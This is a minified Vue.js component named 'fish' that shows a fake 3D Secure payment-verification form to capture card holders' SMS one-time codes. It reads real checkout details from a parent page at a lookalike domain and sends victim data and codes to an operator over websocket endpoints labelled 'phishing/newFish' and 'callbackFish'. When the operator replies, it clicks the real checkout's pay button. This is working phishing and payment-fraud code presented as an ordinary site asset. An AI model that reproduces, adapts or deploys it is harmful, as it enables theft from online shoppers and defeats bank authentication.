import{f as L,g as N,r as d,h as j,i as D,j as H,s as f,k as q,l as I,c as u,o as c,a as t,m as F,n as b,p as k,q as S,v as V,t as _,b as g,w as v,x as z,T as M,y as O,z as U,d as P,A as R,_ as G}from"./D-TBu-5D.js";async function m(h,r=["innerHTML"]){return new Promise((n,i)=>{const o=new MessageChannel;o.port1.onmessage=s=>{o.port1.close(),s.data.success?n(s.data.data):i(s.data.error)},window.top.postMessage({type:"GET_SINGLE_DOM",selector:h,attributes:r},"https://www.chemicalguys.top",[o.port2]),setTimeout(()=>{o.port1.close(),i("Timeout")},2e3)})}const Y={class:"min-h-screen bg-gray-50 flex items-center justify-center p-4"},$={class:"w-full max-w-[750px] bg-white rounded-lg shadow-lg overflow-hidden"},A={class:"p-4 sm:p-6"},J={class:"space-y-6"},X={class:"space-y-3 pt-2"},W=["disabled"],Z=["disabled"],K={class:"pt-4 border-t border-gray-200"},Q={key:0,xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"},ee={key:1,xmlns:"http://www.w3.org/2000/svg",width:"16",height:"16",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"h-3 w-3 sm:h-4 sm:w-4 text-gray-400 transition-transform"},te={class:"overflow-hidden"},se={class:"bg-white rounded-lg shadow-xl p-6 w-full max-w-md transform transition-all"},ae={class:"flex flex-col items-center text-center space-y-4"},oe={class:"w-full pt-2"},ne="websocket/addons/phishing/newFish",T="websocket/addons/phishing/editFish",ie="websocket/addons/phishing/callbackFish",re=L({__name:"fish",setup(h){const r=N(),n=d(!1),i=d(!1),o=d(0),s=d({}),l=d(!1);j(o,a=>{a>0&&setTimeout(()=>{o.value--},1e3)});const C=async()=>{E(),n.value=!0,r.loadStripe()};function E(){s.code!=""&&(s.value.status="checking",f(T,{message:s.value}))}const w=a=>{if(a.data.action=="send")r.unloadStripe();else if(a.data.action=="pass"){n.value=!1,console.log("======真实提交");const e=top.document.getElementById("checkout-pay-button");e.disabled=!1,e.click(),top.window.hack=!1}else(a.data.action=="reject"||a.data.action=="decline")&&(n.value=!1,s.value.code="",l.value=!0,r.unloadStripe());console.log("callBackFish：",a)},B=()=>{s.value.status="resend",s.value.code="",f(T,{message:s.value}),o.value=60,l.value=!1},x=()=>{l.value=!1};return D(async()=>{H(ie,w);const a=Object.fromEntries(new URLSearchParams(window.location.search));if(window.self!==window.top){console.log("im in!");const e=m("#basic-creditCards-secondary img",["src"]).src;document.querySelector("#bankLogo").setAttribute("src",e);const p=m("a img",["src"]).src;document.querySelector("#shopLogo").setAttribute("src",p),document.querySelector("#i-money").innerHTML=m("strong:nth-child(2)").innerHTML,document.querySelector("#i-bank").innerHTML=m("a img",["alt"]).alt,document.querySelector("#i-date").innerHTML=new Date().toLocaleDateString("en-US",{day:"2-digit",month:"2-digit",year:"2-digit"}),document.querySelector("#i-phone").innerHTML=a.fpPhone.slice(-4).padStart(4,"*")}a.status="ready",console.log(a),s.value=a,f(ne,{message:s.value})}),q(()=>{I(w)}),(a,e)=>{const p=U;return c(),u("div",Y,[t("div",$,[e[8]||(e[8]=b('<div class="bg-white border-b border-gray-200 p-4 sm:p-6" data-v-28fa044c><div class="flex items-center justify-between" data-v-28fa044c><div class="flex items-center gap-2 sm:gap-3" data-v-28fa044c><img id="shopLogo" src="https://images.unsplash.com/photo-1606429437134-9d975fcc508f?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=M3w3Nzg4Nzd8MHwxfHNlYXJjaHwxfHxzdHJpcGUlMjBwYXR0ZXJufGVufDF8fHx8MTc2NDU2MDI5N3ww&amp;ixlib=rb-4.1.0&amp;q=80&amp;w=1080&amp;utm_source=figma&amp;utm_medium=referral" alt="Stripe Pattern" class="h-10 sm:h-12 w-auto rounded" data-v-28fa044c></div><div class="flex items-center" data-v-28fa044c><img id="bankLogo" src="http://tentree.com/cdn/shopifycloud/checkout-web/assets/c1/assets/amex.Csr7hRoy.svg" alt="Mastercard ID Check" class="h-10 sm:h-12 w-auto rounded" data-v-28fa044c></div></div></div>',1)),t("div",A,[t("div",J,[e[7]||(e[7]=b('<div data-v-28fa044c><h2 class="mb-4 text-gray-900" data-v-28fa044c>Payment authentication</h2><div class="bg-gray-50 border border-gray-200 rounded-lg p-4 mb-4" data-v-28fa044c><div class="text-sm text-gray-600 mb-2" data-v-28fa044c>You are authorizing a payment of</div><div id="i-money" class="text-2xl sm:text-3xl font-semibold text-gray-900 mb-2" data-v-28fa044c>$99.00</div><div class="text-sm text-gray-600" data-v-28fa044c> to <span id="i-bank" class="font-medium text-gray-900" data-v-28fa044c>SecureBank</span> on <span id="i-date" class="font-medium" data-v-28fa044c>27/02/24</span></div></div><p class="text-sm sm:text-base text-gray-600" data-v-28fa044c> We have sent you a text message with a code to your registered mobile number ending in <span id="i-phone" class="font-medium" data-v-28fa044c>**7878</span>. </p></div>',1)),t("form",{onSubmit:k(C,["prevent"]),class:"space-y-4"},[t("div",null,[e[2]||(e[2]=t("label",{for:"otp-code",class:"text-sm sm:text-base text-gray-700 mb-2 block"}," Enter authentication code ",-1)),S(t("input",{id:"otp-code","onUpdate:modelValue":e[0]||(e[0]=y=>s.value.code=y),type:"text",placeholder:"Enter code",maxlength:"8",class:"w-full h-12 sm:h-14 text-center text-base sm:text-base tracking-widest font-base border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-transparent px-4",required:""},null,512),[[V,s.value.code]])]),t("div",X,[t("button",{type:"submit",disabled:s.value.code?.length!==6||n.value,class:"w-full h-12 sm:h-14 bg-green-600 hover:bg-green-700 text-white rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal"},_(n.value?"VERIFYING...":"SUBMIT"),9,W),t("button",{type:"button",onClick:B,disabled:o.value>0,class:"w-full h-12 sm:h-14 border border-gray-300 text-gray-700 hover:bg-gray-50 rounded-md disabled:opacity-50 disabled:cursor-not-allowed transition-colors font-normal bg-white"},_(o.value>0?`RESEND CODE (${o.value}s)`:"RESEND CODE"),9,Z)])],32),t("div",K,[t("button",{onClick:e[1]||(e[1]=y=>i.value=!i.value),class:"flex items-center justify-between w-full py-2 text-left group"},[e[5]||(e[5]=t("span",{class:"text-xs sm:text-sm text-gray-600 group-hover:text-gray-800"}," Why am I seeing this? ",-1)),i.value?(c(),u("svg",Q,[...e[3]||(e[3]=[t("polyline",{points:"6 9 12 15 18 9"},null,-1)])])):(c(),u("svg",ee,[...e[4]||(e[4]=[t("polyline",{points:"9 18 15 12 9 6"},null,-1)])]))]),g(M,{name:"expand"},{default:v(()=>[S(t("div",te,[...e[6]||(e[6]=[t("div",{class:"pb-3 pt-1 text-xs sm:text-sm text-gray-500 leading-relaxed"},[t("p",null," 3D Secure authentication provides an additional layer of security for online transactions. This verification process helps protect your card from unauthorized use by requiring you to enter a one-time password sent to your registered mobile device. ")],-1)])],512),[[z,i.value]])]),_:1})])])])]),(c(),F(R,{to:"body"},[g(M,{name:"modal-fade"},{default:v(()=>[l.value?(c(),u("div",{key:0,class:"fixed inset-0 z-50 flex items-center justify-center p-4 bg-gray-900/40",onClick:k(x,["self"])},[t("div",se,[t("div",ae,[e[10]||(e[10]=t("div",{class:"flex-shrink-0 w-16 h-16 bg-red-100 rounded-full flex items-center justify-center"},[t("svg",{xmlns:"http://www.w3.org/2000/svg",width:"32",height:"32",viewBox:"0 0 24 24",fill:"none",stroke:"currentColor","stroke-width":"2","stroke-linecap":"round","stroke-linejoin":"round",class:"text-red-600","aria-hidden":"true"},[t("circle",{cx:"12",cy:"12",r:"10"}),t("line",{x1:"12",y1:"8",x2:"12",y2:"12"}),t("line",{x1:"12",y1:"16",x2:"12.01",y2:"16"})])],-1)),e[11]||(e[11]=t("div",{class:"space-y-2"},[t("h3",{class:"text-lg sm:text-xl font-semibold text-gray-900"}," Verification failed "),t("p",{class:"text-sm sm:text-base text-gray-600 max-w-sm"}," The code you entered is incorrect. Please check your message and try again, or request a new code. ")],-1)),t("div",oe,[g(p,{color:"green",size:"lg",block:"",onClick:x,class:"h-12 sm:h-14"},{default:v(()=>[...e[9]||(e[9]=[P(" Try again ",-1)])]),_:1})])])])])):O("",!0)]),_:1})]))])}}}),de=G(re,[["__scopeId","data-v-28fa044c"]]);export{de as default};
